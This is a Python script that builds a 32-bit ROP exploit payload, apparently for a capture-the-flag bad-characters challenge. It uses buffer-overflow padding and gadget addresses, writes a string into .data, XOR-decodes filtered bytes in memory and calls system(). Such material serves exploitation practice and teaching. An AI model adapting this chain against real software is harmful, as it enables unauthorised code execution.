#!/usr/bin/python3

# aat!alag.txt (c2, 1,f7)
# Stage 0
junk = b'A' * 44 # junk

# Stage 1
pop1 = b'\x99\x88\x04\x08' # overwrite eip; Gadget: 'pop esi, pop edi'
edi1 = b'\x38\xa0\x04\x08' # memory address of .data
esi1 = b'aat!' # first 4 bytes
mov1 = b'\x93\x88\x04\x08' # Gadget: 'mov edi, esi'

# Stage 2
edi2 = b'\x3c\xa0\x04\x08' # new .data address (edi1 + 4)
esi2 = b'alag' # next 4 bytes of the string

# Stage 3
edi3 = b'\x40\xa0\x04\x08' # new .data address (edi1 + 8)
esi3 = b'.txt' # next 4 bytes of the string

# XOR 'c'
popx = b'\x96\x88\x04\x08' # pop ebx, ecx;
ebx1 = b'\x38\xa0\x04\x08' # string
ecx1 = b'\x02\x00\x00\x00' # XOR value
xor1 = b'\x90\x88\x04\x08' # call xor

# XOR ' '
popx = b'\x96\x88\x04\x08' # pop ebx, ecx;
ebx2 = b'\x3B\xa0\x04\x08' # string
ecx2 = b'\x01\x00\x00\x00' # XOR value
xor2 = b'\x90\x88\x04\x08' # call xor

# XOR 'f'
popx = b'\x96\x88\x04\x08' # pop ebx, ecx;
ebx3 = b'\x3c\xa0\x04\x08' # string
ecx3 = b'\x07\x00\x00\x00' # XOR value
xor3 = b'\x90\x88\x04\x08' # call xor

# RCE
system = b'\xb7\x87\x04\x08' # address of system()
#fakeret = b'A' * 4 # for some reason not needed?!

# Build payload
payload = junk
payload += pop1 + esi1 + edi1 + mov1
payload += pop1 + esi2 + edi2 + mov1
payload += pop1 + esi3 + edi3 + mov1
payload += popx + ebx1 + ecx1 + xor1
payload += popx + ebx2 + ecx2 + xor2
payload += popx + ebx3 + ecx3 + xor3
payload += system + edi1

with open('rop.txt', 'wb') as w:
        w.write(payload)
